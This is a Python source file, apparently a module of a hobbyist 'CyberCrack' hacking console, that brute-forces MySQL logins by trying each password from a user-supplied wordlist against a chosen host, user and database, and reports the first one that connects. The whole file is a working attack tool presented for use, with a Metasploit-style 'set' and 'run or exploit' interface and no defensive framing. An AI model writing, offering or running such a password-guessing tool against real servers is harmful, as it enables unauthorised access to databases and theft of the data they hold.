# Brute force sql login
# Created by HackPlaz
# Testing stage
from colorama import *
init(autoreset=False)
red = Fore.RED
green = Fore.GREEN
blue = Fore.BLUE
reset = Fore.RESET


def help():
    print(r"""
: set HOST       the host which the sql server is running
: set DB_NAME    the name of the database
: set USER       username of the database
: set WORDLIST   the wordlist to try
: run or exploit run the script
    """)
def crack(user, host, database, wordlist):
    try:
        import time


        with open(str(wordlist), "r") as wordlist:
            wordlist = wordlist.readlines()
            Attempt = 0
            for phrase in wordlist:
                password = phrase
                import mysql.connector
                from mysql.connector import errorcode
                from mysql.connector import connection
                Attempt = Attempt + 1
                if password == "":
                    continue
                else:
                    print(green + "[+] Trying the password - " + str(password) + reset)
                    try:
                        sql = connection.MySQLConnection(
                                user=user,
                                password=password,
                                host=host,
                                database=database)

                    except mysql.connector.Error as err:
                        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
                            print(red + "[*] Attempt " + str(Attempt) + " failed" + reset)
                        elif err.errno == errorcode.ER_BAD_DB_ERROR:
                            print(red + "[*] Database does not exist" + reset)
                        else:
                            print(err)
                    else:
                        time.sleep(1)
                        print(green + "[!] Password found. The password is " + blue + str(password) + reset + green + ", Attempt " + str(Attempt) + " passed" + reset)
                        break
            else:
                print(red + "[+] Password not found in the given wordlist" + reset)
    except KeyboardInterrupt:
        print("")
    except PermissionError:
        print(red + "!! Access denied !!")
    except FileNotFoundError:
        print(red + "File not found" + reset)
def console():
    while True:
        try:
            user_in = input("\nCyberCrack: CyberServe/brute_force/sql_login > ")
            if user_in.startswith("set"):
                if user_in.split()[1] == "HOST":
                    host = user_in.split()[2]
                    print("HOST = " + str(host))
                elif user_in.split()[1] == "USER":
                    user = user_in.split()[2]
                    print("USER = " + str(user))
                elif user_in.split()[1] == "WORDLIST":
                    word_list = user_in.split()[2]
                    print("WORDLIST = " + str(word_list))
                elif user_in.split()[1] == "DB_NAME":
                    name = user_in.split()[2]
                    print("DB_NAME = " + str(name))
                else:
                    print(red + "Invalid parameter for set" + reset)
            elif user_in == "run" or user_in == "exploit":
                crack(user=user, database=name, host=host, wordlist=word_list)
            elif user_in == "help" or user_in == "show options":
                help()
            else:
                print("Invalid command")
        except KeyboardInterrupt:
            break
        except NameError:
            print("[+] Assign all parameters related to this module")
            continue
        except EOFError:
            continue